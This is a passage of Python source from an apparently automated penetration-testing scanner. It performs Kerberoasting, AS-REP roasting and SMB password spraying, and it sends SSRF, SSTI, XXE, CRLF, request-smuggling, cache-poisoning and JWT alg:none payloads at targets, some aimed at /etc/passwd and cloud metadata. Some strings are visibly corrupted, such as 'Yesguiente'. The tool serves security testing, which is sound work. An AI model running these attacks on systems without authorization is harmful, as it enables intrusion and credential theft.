                        rows=[[_adtrim(h.get("username") or "-", 28), _adtrim(h.get("hash") or "-", 90)] for h in hashes[:20]],
                        alignments=['<', '<'],
                        title=f"AS-REP Roasting ({len(hashes)}):",
                        border_color=Fore.YELLOW,
                    )
                for item in hashes:
                    _append_finding_once(f"[AD:ASREP] {item.get('username') or 'user'} hash AS-REP roastable")
    else:
        print_warning("impacket-GetNPUsers is not installed or is not in PATH. Skipping AS-REP roasting.")

    getspns_path = check_impacket_getuserspns()
    if getspns_path:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Run Kerberoasting with impacket-GetUserSPNs? [Y/n]:")
        do_kerberoast = input("> ").strip().lower() != 'n'
        if do_kerberoast:
            if not username or not password:
                print_warning("Kerberoasting with GetUserSPNs requires domain credentials. Skipping.")
            else:
                roast_user = username
                if "\\" in roast_user:
                    roast_user = roast_user.split("\\", 1)[1]
                if "@" in roast_user:
                    roast_user = roast_user.split("@", 1)[0]
                out_file = os.path.join(_ad_artifact_dir(domain, dc), "kerberoast_hashes.txt")
                cmd = [
                    getspns_path,
                    f"{domain}/{roast_user}:{password}",
                    "-dc-ip", dc,
                    "-request",
                    "-outputfile", out_file,
                ]
                run = _run_ad_command(cmd, "impacket-GetUserSPNs Kerberoast", timeout=900, secrets=[password])
                hashes = _normalize_kerberos_hashes(
                    _read_hash_lines(out_file, run.get("output", "")),
                    "kerberoast",
                )
                result["impacket"]["kerberoast"] = {
                    "attempted": True,
                    "command": run.get("command"),
                    "returncode": run.get("returncode"),
                    "output_file": out_file,
                    "hashes": hashes,
                    "output": run.get("output", ""),
                }
                result["raw_commands"].append(run)
                if hashes:
                    print_good(f"Kerberoasting: {len(hashes)} hash(es) TGS capturado(s).")
                    print_table(
                        headers=["User/SPN", "Hash TGS"],
                        rows=[[_adtrim(h.get("username") or "-", 28), _adtrim(h.get("hash") or "-", 90)] for h in hashes[:20]],
                        alignments=['<', '<'],
                        title=f"Kerberoasting ({len(hashes)}):",
                        border_color=Fore.YELLOW,
                    )
                for item in hashes:
                    _append_finding_once(f"[AD:KERBEROAST] {item.get('username') or 'user'} SPN Kerberoastable")
    else:
        print_warning("impacket-GetUserSPNs is not installed or is not in PATH. Skipping Kerberoasting.")

    nxc_path = check_nxc()
    if nxc_path:
        nxc_base = [nxc_path, "smb", dc, "-d", domain]
        if username:
            nxc_base += ["-u", username, "-p", password]
        else:
            nxc_base += ["-u", "", "-p", ""]
        enum_cmd = nxc_base + ["--users", "--groups", "--shares", "--pass-pol"]
        run = _run_ad_command(enum_cmd, "nxc smb enum", timeout=600, secrets=[password])
        result["nxc"]["enum"] = {
            "command": run.get("command"),
            "returncode": run.get("returncode"),
            "output": run.get("output", ""),
        }
        result["raw_commands"].append(run)

        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Run brute force/password spray with nxc? [y/N]:")
        brute = input("> ").strip().lower() in ('y', 's')
        if brute:
            default_users = _default_ad_user_wordlist()
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} User or userlist path [{username or default_users or 'required'}]:")
            nxc_users = input_path("> ").strip() or username or default_users
            default_pass = _default_ad_password_wordlist()
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Password or passlist path [{default_pass or 'required'}]:")
            nxc_pass = input_path("> ").strip() or default_pass
            if not nxc_users or not nxc_pass:
                print_warning("User/userlist and password/passlist are required for nxc bruteforce.")
            else:
                brute_cmd = [
                    nxc_path, "smb", dc, "-d", domain,
                    "-u", nxc_users, "-p", nxc_pass,
                    "--continue-on-success",
                ]
                run_brute = _run_ad_command(
                    brute_cmd,
                    "nxc smb bruteforce",
                    timeout=1800,
                    secrets=[password, nxc_pass if not os.path.isfile(nxc_pass) else ""],
                )
                creds = _parse_nxc_credentials(run_brute.get("output", ""))
                result["nxc"]["bruteforce"] = {
                    "attempted": True,
                    "command": run_brute.get("command"),
                    "returncode": run_brute.get("returncode"),
                    "credentials": creds,
                    "output": run_brute.get("output", ""),
                }
                result["raw_commands"].append(run_brute)
                for cred in creds:
                    _append_finding_once(f"[AD:CRED] {cred.get('username')}:{cred.get('password')}")
                if creds:
                    print_table(
                        headers=["User", "Password"],
                        rows=[[f"{Fore.GREEN}{_adtrim(c.get('username') or '-', 40)}{Style.RESET_ALL}",
                               f"{Fore.GREEN}{_adtrim(c.get('password') or '-', 40)}{Style.RESET_ALL}"] for c in creds],
                        alignments=['<', '<'],
                        title=f"NXC — valid credentials ({len(creds)}):",
                        border_color=Fore.GREEN,
                    )
    else:
        print_warning("nxc/netexec is not installed or is not in PATH. Skipping SMB/NXC.")

    ldap_users = result["ldap"].get("users", [])
    ldap_groups = result["ldap"].get("groups", [])
    ldap_computers = result["ldap"].get("computers", [])
    kb_users = result.get("kerbrute", {}).get("valid_users", [])
    nxc_creds = result.get("nxc", {}).get("bruteforce", {}).get("credentials", [])
    asrep_hashes = result.get("impacket", {}).get("asrep_roast", {}).get("hashes", [])
    kerberoast_hashes = result.get("impacket", {}).get("kerberoast", {}).get("hashes", [])
    print_table(
        headers=["Source", "Total"],
        rows=[
            ["Kerbrute users validos", str(len(kb_users))],
            ["AS-REP roastable", str(len(asrep_hashes))],
            ["Kerberoastable SPNs", str(len(kerberoast_hashes))],
            ["LDAP users", str(len(ldap_users))],
            ["LDAP groups", str(len(ldap_groups))],
            ["LDAP computers", str(len(ldap_computers))],
            ["NXC credentials", str(len(nxc_creds))],
        ],
        alignments=['<', '>'],
        title="Summary Active Directory:",
    )
    SCAN_DATA["active_directory"] = result
    return result

# ========== HEADLESS LOGIN (PLAYWRIGHT) ==========

def check_playwright():
    return HAS_PLAYWRIGHT

def install_playwright():
    print_info("Installing Playwright and Chromium browser...")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "playwright"], check=True)
        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True)
        print_good("Playwright installed successfully.")
        return True
    except Exception as e:
        print_error(f"Error instalando playwright: {e}")
        return False

def _attempt_headless_login(login_url, identifier, password, user_agent=None):
    """Headless login with Playwright for SPAs (Angular/Vue/React) and OAuth2/OIDC.
    Returns (cookies_dict, final_url) or (None, None) if it fails."""
    if not HAS_PLAYWRIGHT:
        return None, None
    ua = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True, args=["--no-sandbox"])
            ctx = browser.new_context(user_agent=ua, ignore_https_errors=not VERIFY_TLS)
            page = ctx.new_page()
            page.goto(login_url, wait_until="networkidle", timeout=30000)

            # Wait for any email/user/password field to appear.
            for sel in ["input[type='email']", "input[name*='email']", "input[name*='user']",
                        "input[name*='login']", "input[name*='identifier']"]:
                try:
                    page.wait_for_selector(sel, timeout=5000)
                    page.fill(sel, identifier)
                    break
                except Exception:
                    continue

            # Some OAuth2 flows have the password field in a second step.
            # We try clicking "Next"/"Continue" if there is no visible password field.
            try:
                page.wait_for_selector("input[type='password']", timeout=4000)
            except Exception:
                for btn_sel in [
                    "button[type='submit']", "input[type='submit']",
                    "button:has-text('Next')", "button:has-text('Yesguiente')",
                    "button:has-text('Continue')", "button:has-text('Continuar')",
                    "[data-testid='next-button']",
                ]:
                    try:
                        page.click(btn_sel, timeout=3000)
                        page.wait_for_selector("input[type='password']", timeout=5000)
                        break
                    except Exception:
                        continue

            try:
                page.fill("input[type='password']", password)
            except Exception:
                browser.close()
                return None, None

            # Submit the form.
            submitted = False
            for btn_sel in [
                "button[type='submit']", "input[type='submit']",
                "button:has-text('Login')", "button:has-text('Yesgn in')",
                "button:has-text('Connexion')",
                "[data-testid='login-button']", "[data-testid='submit']",
            ]:
                try:
                    page.click(btn_sel, timeout=3000)
                    submitted = True
                    break
                except Exception:
                    continue
            if not submitted:
                page.keyboard.press("Enter")

            try:
                page.wait_for_load_state("networkidle", timeout=10000)
            except Exception:
                pass

            final_url = page.url
            raw_cookies = ctx.cookies()
            browser.close()

        if not raw_cookies:
            return None, None

        # Comprueba si la URL final es distinta a la de login (redireccion post-auth).
        from_login = urlparse(login_url).path.rstrip("/")
        to_path = urlparse(final_url).path.rstrip("/")
        if from_login and from_login == to_path:
            return None, final_url  # No hubo redireccion: probablemente failed.

        cookies = {c["name"]: c["value"] for c in raw_cookies if c.get("name")}
        return cookies, final_url

    except Exception as e:
        print_warning(f"Login headless error: {e}")
        return None, None

def _apply_playwright_cookies_to_session(session, cookies_dict, target_url=None):
    """Load a dict of cookies obtained with Playwright into the requests session."""
    if not cookies_dict:
        return
    cookie_string = "; ".join(f"{k}={v}" for k, v in cookies_dict.items())
    _apply_cookie_string_to_session(session, cookie_string, target_url)


# ========== SSRF ==========

SSRF_INTERNAL_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",   # AWS IMDSv1
    "http://169.254.169.254/",
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://100.100.100.200/latest/meta-data/",    # Alibaba Cloud
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
]

SSRF_URL_PARAMS = [
    "url", "uri", "path", "src", "source", "dest", "destination",
    "redirect", "return", "callback", "next", "continue", "to",
    "out", "view", "file", "load", "fetch", "link", "href",
    "feed", "host", "proxy", "forward", "api",
]

SSRF_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Original-URL",
    "X-Rewrite-URL",
    "Client-IP",
    "True-Client-IP",
    "Referer",
    "Origin",
    "X-Forwarded-Host",
]

def _ssrf_payload_response_looks_internal(resp_text):
    markers = [
        "ami-id", "instance-id", "local-hostname", "security-credentials",
        "computeMetadata", "serviceAccounts",
        "root:x:", "/bin/bash", "/bin/sh",
        "hostname", "instance",
    ]
    body = (resp_text or "").lower()
    return any(m.lower() in body for m in markers)

# SSRF probes with deterministic oracle: each payload causes the server
# reads an internal resource whose content we recognize without false positives (so
# diferencia de comparar tamanos/respuestas). file:// confirma lectura local.
SSRF_PROBES = [
    ("file:///etc/passwd",
     ["root:x:0:0:", "daemon:x:", ":/bin/bash"]),
    ("http://169.254.169.254/latest/meta-data/",
     ["ami-id", "instance-id", "public-keys", "iam/", "local-hostname"]),
    ("http://metadata.google.internal/computeMetadata/v1/",
     ["computemetadata", "project/", "instance/"]),
]


def _collect_injection_points(target):
    """Collect discovered injection vectors (spider + forms + module
    injection) and the list of known endpoints, so the tests
    advanced (SSRF/SSTI/XXE) hit real app endpoints and not only
    the root. Returns (get_points, post_points, endpoints)."""
    get_points, post_points = [], []
    endpoints, seen_pt = set(), set()

    def _clean(url):
        if not url:
            return None
        p = urlparse(url)
        if not p.scheme:
            url = urljoin(target, url)
            p = urlparse(url)
        return f"{p.scheme}://{p.netloc}{p.path}"

    def _add_point(url, param, method):
        clean = _clean(url)
        if not clean or not param:
            return
        key = (clean, param, method)
        if key in seen_pt:
            return
        seen_pt.add(key)
        (post_points if method == "POST" else get_points).append((clean, param))

    spider = SCAN_DATA.get("spider") or {}
    for u in (spider.get("sample_urls") or []):
        ep = _clean(u)
        if ep:
            endpoints.add(ep)
        for k in parse_qs(urlparse(u).query):
            _add_point(u, k, "GET")

    forms = list(spider.get("sample_forms") or [])
    forms += list((SCAN_DATA.get("injection") or {}).get("forms") or [])
    for form in forms:
        action = form.get("action") or form.get("url") or form.get("page_url") or target
        method = (form.get("method") or "GET").upper()
        ep = _clean(action)
        if ep:
            endpoints.add(ep)
        for inp in (form.get("inputs") or []):
            _add_point(action, inp, method)

    for h in (SCAN_DATA.get("directory_hits") or []):
        endpoints.add(_clean(h.get("url") if isinstance(h, dict) else h))
    for e in (SCAN_DATA.get("api_endpoints") or []):
        endpoints.add(_clean(e.get("url") if isinstance(e, dict) else e))
    endpoints.discard(None)
    endpoints.add(_clean(target))
    return get_points, post_points, sorted(e for e in endpoints if e)


def _send_probe(session, url, param, payload, method):
    try:
        if method == "POST":
            return session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT,
                                allow_redirects=True)
        return session.get(url, params={param: payload}, timeout=DEFAULT_TIMEOUT,
                           allow_redirects=True)
    except requests.RequestException:
        return None


def test_ssrf(target, session, collaborator_url=None):
    """SSRF: attacks the parameters/endpoints discovered by the spider (not only
    the root) using deterministic oracles (file://, cloud metadata)."""
    results = []
    confirmed = set()
    get_points, post_points, endpoints = _collect_injection_points(target)

    # Vectors: discovered parameters (GET/POST) + common SSRF names
    # against each known endpoint (to cover endpoints whose form isn't
    # capturo, p.ej. /ssrf?url=).
    vectors, vseen = [], set()

    def _add_vec(url, param, method):
        key = (url, param, method)
        if key not in vseen:
            vseen.add(key)
            vectors.append((url, param, method))

    for url, param in get_points:
        _add_vec(url, param, "GET")
    for url, param in post_points:
        _add_vec(url, param, "POST")
    for ep in endpoints[:60]:
        for param in SSRF_URL_PARAMS:
            _add_vec(ep, param, "GET")

    print_info(f"Testing SSRF on {len(vectors)} vectors (discovered parameters + endpoints)...")
    for url, param, method in vectors:
        if (url, param) in confirmed:
            continue
        # For fuzzing common names the file:// oracle is enough; for points
        # that are actually discovered, all probes are tested.
        probes = SSRF_PROBES if (url, param) in {(u, p) for u, p in get_points + post_points} else SSRF_PROBES[:1]
        for payload, markers in probes:
            resp = _send_probe(session, url, param, payload, method)
            if resp is None or resp.status_code >= 500:
                continue
            low = (resp.text or "").lower()
            # Only markers that are NOT part of the payload: if the app reflects
            # el payload (p.ej. un endpoint SSTI/eco), 'computeMetadata' apareceria
            # without SSRF existing. Require a marker from the internal CONTENT.
            plow = payload.lower()
            eff_markers = [m for m in markers if m.lower() not in plow]
            if eff_markers and any(m.lower() in low for m in eff_markers):
                confirmed.add((url, param))
                msg = (f"SSRF confirmado: {method} {url} parametro '{param}' "
                       f"lee recurso interno ({payload})")
                print_vuln(msg)
                results.append({"type": "ssrf", "param": param, "payload": payload,
                                "url": url, "method": method, "status": resp.status_code})
                FINDINGS.append({"name": "SSRF", "detail": msg, "severity": "critical"})
                break
            if collaborator_url:
                _send_probe(session, url, param, collaborator_url, method)

    # Headers with internal IPs (deterministic oracle).
    print_info("Testing SSRF via HTTP headers...")
    for header in SSRF_HEADERS:
        for payload, markers in SSRF_PROBES[1:]:
            try:
                resp = session.get(target, headers={header: payload}, timeout=DEFAULT_TIMEOUT)
            except requests.RequestException:
                continue
            low = (resp.text or "").lower()
            plow = payload.lower()
            eff_markers = [m for m in markers if m.lower() not in plow]
            if eff_markers and any(m.lower() in low for m in eff_markers):
                msg = f"SSRF via header '{header}: {payload}' returns internal data"
                print_vuln(msg)
                results.append({"type": "ssrf-header", "header": header, "value": payload,
                                "status": resp.status_code})
                FINDINGS.append({"name": "SSRF (header)", "detail": msg, "severity": "critical"})

    if not results:
        print_info("No signs of SSRF in the tested vectors.")
    return results


# ========== SSTI ==========

# Distinctive operands: the product (1787569) doesn't appear by chance in a
# page or inside the payload itself, so its presence confirms that the
# engine evaluated the expression (not a simple reflection of the input).
SSTI_PROBES = [
    # (payload, expected_in_response, engine_hint)
    ("{{1337*1337}}", "1787569", "Jinja2/Twig/Nunjucks"),
    ("${1337*1337}", "1787569", "FreeMarker/Thymeleaf EL"),
    ("#{1337*1337}", "1787569", "Ruby/Pebble"),
    ("<%= 1337*1337 %>", "1787569", "ERB/EJS"),
    ("${{1337*1337}}", "1787569", "Pebble"),
    ("%{{1337*1337}}", "1787569", "Tornado/Mako"),
    ("[[${1337*1337}]]", "1787569", "Thymeleaf"),
    ("{{1337*'1'}}", "1337", "Twig/Jinja2 str"),
]

# Only engine-specific error signatures (exception classes / tracebacks),
# not generic words like "jinja2" or "template" that appear on pages
# descriptive without an actual vulnerability existing.
SSTI_ERROR_MARKERS = [
    "TemplateSyntaxError", "jinja2.exceptions", "UndefinedError",
    "Twig_Error_Syntax", "freemarker.core.", "TemplateError",
    "org.thymeleaf.exceptions", "smarty: syntax error",
]

def test_ssti(url, param, session, method="GET", probes=None):
    """SSTI detection via math probes. Returns True if it confirms vulnerability.
    'probes' allows limiting the probes (light fuzz of parameter names)."""
    for payload, expected, engine in (probes or SSTI_PROBES):
        try:
            if method == "GET":
                resp = session.get(url, params={param: payload}, timeout=DEFAULT_TIMEOUT)
            else:
                resp = session.post(url, data={param: payload}, timeout=DEFAULT_TIMEOUT)
            body = resp.text or ""
            # The distinctive result (e.g. 1787569) only appears if the engine
            # evaluated the expression; it's not in the payload and doesn't usually appear in the
            # page, so it confirms execution (not a mere reflection).
            if expected in body and expected not in payload:
                msg = f"SSTI confirmed ({engine}) on parameter '{param}' — payload '{payload}' -> '{expected}' in the response"
                print_vuln(msg)
                FINDINGS.append({"name": "SSTI", "detail": msg, "severity": "critical",
                                  "url": url, "param": param, "engine": engine})
                return True
            if any(marker.lower() in body.lower() for marker in SSTI_ERROR_MARKERS):
                msg = f"Probable SSTI (template error) on '{param}' with payload '{payload}'"
                print_warning(msg)
                FINDINGS.append({"name": "SSTI (error)", "detail": msg, "severity": "high",
                                  "url": url, "param": param})
                return True
        except requests.RequestException:
            pass
    return False


# ========== XXE ==========

XXE_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
]

# Common field names where the entity is injected. Many backends only
# reflect specific fields (name, message, ...), so a payload
# <root><data> generic doesn't show the content; it's injected into several at once.
XXE_FIELD_NAMES = [
    "name", "data", "value", "message", "text", "comment",
    "title", "content", "email", "subject", "input", "xml", "body",
]


def _build_xxe_payloads(field_names=None):
    """Generates XXE payloads by injecting the entity into multiple fields to
    maximize reflection. Returns [(payload, markers|None), ...]."""
    fields = list(dict.fromkeys((field_names or []) + XXE_FIELD_NAMES))
    inner = "".join(f"<{f}>&xxe;</{f}>" for f in fields if re.match(r"^[A-Za-z_][\w.-]*$", f))
    if not inner:
        inner = "<data>&xxe;</data>"

    def _doc(entity_decl):
        return (f'<?xml version="1.0"?><!DOCTYPE foo [{entity_decl}]>'
                f'<root>{inner}</root>')

    return [
        (_doc('<!ENTITY xxe SYSTEM "file:///etc/passwd">'),
         ["root:x:0:0:", "daemon:x:", ":/bin/bash"]),
        (_doc('<!ENTITY xxe SYSTEM "file:///etc/hostname">'), None),
        (_doc('<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">'),
         ["ami-id", "instance-id", "local-hostname", "public-keys"]),
    ]


def _xml_endpoint_candidates(target, found_endpoints):
    """Builds candidate endpoints for XXE from spider, forms,
    known directories and endpoints, deriving API/XML suffixes and normalizing
    prefixes like /lab/<x> -> /<x> and /<x>/api (where the XML parser often lives)."""
    cand = set()

    def _add(u):
        if not u:
            return
        u = u.split("?")[0]
        if not urlparse(u).scheme:
            u = urljoin(target, u)
        cand.add(u)

    for e in (found_endpoints or []):
        _add(e.get("url") if isinstance(e, dict) else e)
    spider = SCAN_DATA.get("spider") or {}
    for u in (spider.get("sample_urls") or []):
        _add(u)
    for f in (spider.get("sample_forms") or []):
        _add(f.get("action") or f.get("url") or f.get("page_url"))
    for h in (SCAN_DATA.get("directory_hits") or []):
        _add(h.get("url") if isinstance(h, dict) else h)

    derived = set()
    for u in list(cand):
        p = urlparse(u)
        path = p.path.rstrip("/")
        roots = {path}
        m = re.match(r"^/lab(/[^/]+.*)$", path)   # /lab/xxe -> /xxe
        if m:
            roots.add(m.group(1))
        for r in roots:
            base = f"{p.scheme}://{p.netloc}{r}"
            derived.add(base)
            for suf in ("/api", "/xml", "/import", "/parse", "/upload", "/ws", "/soap"):
                derived.add(base + suf)
    cand |= derived
    for suffix in ("/xmlrpc.php", "/soap", "/api/xml", "/ws", "/service.asmx", "/api/v1/xml"):
        cand.add(urljoin(target, suffix))
    return sorted(c for c in cand if c)


def test_xxe(target, session, found_endpoints=None):
    """XXE: discovers endpoints that accept XML (including derived ones such as
    /xxe/api) and test local file reads with a deterministic oracle."""
    results = []
    # Field names discovered in forms, to inject where they get reflected.
    form_fields = []
    for f in ((SCAN_DATA.get("spider") or {}).get("sample_forms") or []):
        form_fields.extend(f.get("inputs") or [])
    payloads = _build_xxe_payloads(form_fields)

    candidates = _xml_endpoint_candidates(target, found_endpoints)[:80]
    print_info(f"Testing XXE en {len(candidates)} endpoint(s) candidatos (XML)...")
    hit_eps = set()
    for endpoint_url in candidates:
        # Quick probe: does it accept POST with an XML body?
        try:
            probe = session.post(endpoint_url, data="<x/>",
                                 headers={"Content-Type": "application/xml"},
                                 timeout=DEFAULT_TIMEOUT)
        except requests.RequestException:
            continue
        if probe.status_code in (404, 405, 415, 501):
            continue
        for content_type in XXE_CONTENT_TYPES:
            if endpoint_url in hit_eps:
                break
            for payload, markers in payloads:
                try:
                    resp = session.post(endpoint_url, data=payload,
                                        headers={"Content-Type": content_type},
                                        timeout=DEFAULT_TIMEOUT)
                except requests.RequestException:
                    continue
                body = resp.text or ""
                if markers and any(m in body for m in markers):
                    msg = f"XXE confirmed in {endpoint_url} (Content-Type: {content_type}) — local file read"
                    print_vuln(msg)
                    results.append({"url": endpoint_url, "content_type": content_type,
                                    "payload": payload[:80]})
                    FINDINGS.append({"name": "XXE", "detail": msg, "severity": "critical"})
                    hit_eps.add(endpoint_url)
                    break
    if not results:
        print_info("No signs of XXE in the tested endpoints.")
    return results


# ========== CRLF ==========

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie%3Acrlf_test%3Dinjected",
    "%0aSet-Cookie%3Acrlf_test%3Dinjected",
    "%0d%0aX-CRLF-Test%3A injected",
    "/%0d%0aSet-Cookie%3Acrlf_test%3Dinjected",
    "%E5%98%8D%E5%98%8ASet-Cookie%3Acrlf_test%3Dinjected",  # doble encode unicode
]

def test_crlf(target, session):
    """CRLF injection / HTTP Response Splitting in parameters and routes."""
    results = []
    print_info("Testing CRLF injection...")
    base_parsed = urlparse(target)

    for payload in CRLF_PAYLOADS:
        # En path.
        injected_url = f"{target}/{payload}"
        try:
            resp = session.get(injected_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            if "crlf_test" in resp_headers_lower or "set-cookie" in str(resp.headers).lower() and "crlf_test" in str(resp.headers).lower():
                msg = f"CRLF confirmado en path: {injected_url[:80]}"
                print_vuln(msg)
                results.append({"vector": "path", "payload": payload, "url": injected_url})
                FINDINGS.append({"name": "CRLF Injection", "detail": msg, "severity": "high"})
        except requests.RequestException:
            pass

        # En parametro 'url' / 'redirect'.
        for param in ["url", "redirect", "next", "return", "r"]:
            test_url = f"{target}?{param}=https://example.com{payload}"
            try:
                resp = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=False)
                if "crlf_test" in str(resp.headers).lower():
                    msg = f"CRLF confirmado via parametro '{param}': {test_url[:80]}"
                    print_vuln(msg)
                    results.append({"vector": "param", "param": param, "payload": payload})
                    FINDINGS.append({"name": "CRLF Injection", "detail": msg, "severity": "high"})
            except requests.RequestException:
                pass

    if not results:
        print_info("No signs of CRLF in the tested vectors.")
    return results


# ========== HTTP REQUEST SMUGGLING ==========

def check_smuggler():
    return bool(shutil.which("smuggler") or shutil.which("smuggler.py") or
                os.path.exists(os.path.join(os.path.expanduser("~"), "smuggler", "smuggler.py")))

def _find_smuggler_path():
    for p in ["smuggler", "smuggler.py",
              os.path.join(os.path.expanduser("~"), "smuggler", "smuggler.py")]:
        if shutil.which(p) or os.path.exists(p):
            return p
    return None

def test_request_smuggling(target, session):
    """HTTP Request Smuggling: uses smuggler if available, otherwise does a manual CL.TE / TE.CL test."""
    results = []
    smuggler = _find_smuggler_path()
    if smuggler:
        print_info(f"Using smuggler.py for HTTP Request Smuggling...")
        try:
            cmd = ["python3", smuggler, "-u", target, "-t", str(DEFAULT_TIMEOUT), "-q"]
            if smuggler == "smuggler":
                cmd = ["smuggler", "-u", target, "-t", str(DEFAULT_TIMEOUT), "-q"]
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            output = (out.stdout or "") + (out.stderr or "")
            if any(x in output.lower() for x in ["vulnerable", "smuggl", "clte", "tecl", "found"]):
                msg = f"HTTP Request Smuggling detected by smuggler.py on {target}"
                print_vuln(msg)
                results.append({"tool": "smuggler", "output_snippet": output[:300]})
                FINDINGS.append({"name": "HTTP Request Smuggling", "detail": msg, "severity": "critical"})
            else:
                print_info("smuggler.py found no signs of smuggling.")
        except subprocess.TimeoutExpired:
            print_warning("smuggler.py timeout.")
        except Exception as e:
            print_warning(f"smuggler.py error: {e}")
    else:
        print_info("smuggler.py not found. Manual CL.TE / TE.CL test...")
        # Manual CL.TE test with a raw socket.
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_tls = parsed.scheme == "https"
        path = parsed.path or "/"
        # CL.TE payload: Content-Length says 6, Transfer-Encoding: chunked, chunked body with 0 ends early.
        smuggle_req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"G"
        ).encode()
        try:
            sock = socket.create_connection((host, port), timeout=DEFAULT_TIMEOUT)
            if use_tls:
                ctx = ssl.create_default_context()
                if not VERIFY_TLS:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.sendall(smuggle_req)
            resp_raw = b""
            sock.settimeout(5)
            try:
                while True:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    resp_raw += chunk
            except socket.timeout:
                pass
            sock.close()
            resp_text = resp_raw.decode("utf-8", errors="ignore")
            if "400" in resp_text and ("bad request" in resp_text.lower() or "invalid" in resp_text.lower()):
                print_info("CL.TE: server returned 400 — possible conflict detection (review manually).")
                results.append({"type": "clte-400", "note": "possible smuggling, verify with smuggler.py"})
            else:
                print_info("No anomalous response in manual CL.TE test.")
        except Exception as e:
            print_warning(f"Could not run manual smuggling test: {e}")
        print_info("For full analysis: pip install requests && git clone https://github.com/defparam/smuggler")

    if not results:
        print_info("No confirmed signs of HTTP Request Smuggling.")
    return results


# ========== CACHE POIOSNING ==========

CACHE_POIOSN_HEADERS = [
    ("X-Forwarded-Host", "evil-canary-{rand}.com"),
    ("X-Host", "evil-canary-{rand}.com"),
    ("X-Forwarded-Scheme", "http"),
    ("X-Original-URL", "/admin-canary-{rand}"),
    ("X-Rewrite-URL", "/admin-canary-{rand}"),
    ("X-Forwarded-Server", "evil-canary-{rand}.com"),
    ("Forwarded", "host=evil-canary-{rand}.com"),
]

def test_cache_poisoning(target, session):
    """Cache Poisoning: inject control headers and check reflection in cached response."""
    results = []
    print_info("Testing Cache Poisoning via non-standard headers...")
    import random, string
    rand_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))

    for header_tpl, value_tpl in CACHE_POIOSN_HEADERS:
        value = value_tpl.replace("{rand}", rand_id)
        try:
            # Primera peticion: inyectamos la cabecera.
            resp1 = session.get(target, headers={header_tpl: value},
                                timeout=DEFAULT_TIMEOUT, allow_redirects=True)
            body1 = resp1.text or ""
            # Second request without the header: if the injected value appears, cache poisoning occurred.
            resp2 = session.get(target, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
            body2 = resp2.text or ""

            reflected_in_1 = rand_id in body1 or value in body1
            reflected_in_2 = rand_id in body2 or value in body2

            if reflected_in_1 and reflected_in_2:
                msg = f"Cache Poisoning confirmed via '{header_tpl}: {value}' — injected value persists in the response without the header"
                print_vuln(msg)
                results.append({"header": header_tpl, "value": value, "confirmed": True})
                FINDINGS.append({"name": "Cache Poisoning", "detail": msg, "severity": "high"})
            elif reflected_in_1:
                msg = f"Cache Poisoning possible — '{header_tpl}: {value}' is reflected in the response with the header present"
                print_warning(msg)
                results.append({"header": header_tpl, "value": value, "confirmed": False, "reflected": True})
                FINDINGS.append({"name": "Cache Poisoning (reflected)", "detail": msg, "severity": "medium"})
        except requests.RequestException:
            pass

    # X-Cache / Age header to check whether the target uses cache.
    try:
        resp = session.get(target, timeout=DEFAULT_TIMEOUT)
        cache_headers = {k.lower(): v for k, v in resp.headers.items()}
        cache_active = bool(cache_headers.get("x-cache") or cache_headers.get("age") or
                            cache_headers.get("cf-cache-status") or cache_headers.get("x-varnish"))
        if not cache_active:
            print_info("No cache headers detected (X-Cache/Age/CF-Cache-Status). The target may not use public cache.")
    except Exception:
        pass

    if not results:
        print_info("No signs of Cache Poisoning in the tested vectors.")
    return results


# ========== JWT AVANZADO ==========

def _b64_decode_jwt(s):
    s += "=" * (4 - len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s).decode("utf-8", errors="ignore"))

def _b64_encode_jwt(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).rstrip(b"=").decode()

def _jwt_forge_alg_none(token):
    """Generate a token version with alg:none and no signature."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header = _b64_decode_jwt(parts[0])
    header["alg"] = "none"
    return f"{_b64_encode_jwt(header)}.{parts[1]}."

def _jwt_test_alg_none(target, session, token, header_name="Authorization", prefix="Bearer"):
    """Send the token with alg:none and check whether the server accepts it."""
    forged = _jwt_forge_alg_none(token)
    if not forged:
        return False
    test_headers = {header_name: f"{prefix} {forged}"}
    try:
        r1 = session.get(target, timeout=DEFAULT_TIMEOUT)
        r2 = session.get(target, headers=test_headers, timeout=DEFAULT_TIMEOUT)
        # If the alg:none response has the same content as the authenticated one, it is vulnerable.
        if r2.status_code == r1.status_code and r2.status_code not in (401, 403):
            return True
    except Exception:
        pass
    return False

def _jwt_brute_secret(token, wordlist=None):
    """Brute force HMAC secret with a small wordlist. Return the secret if found."""
    try:
        import hmac as _hmac
        import hashlib as _hashlib
    except ImportError:
        return None
    parts = token.split(".")
    if len(parts) != 3:
        return None
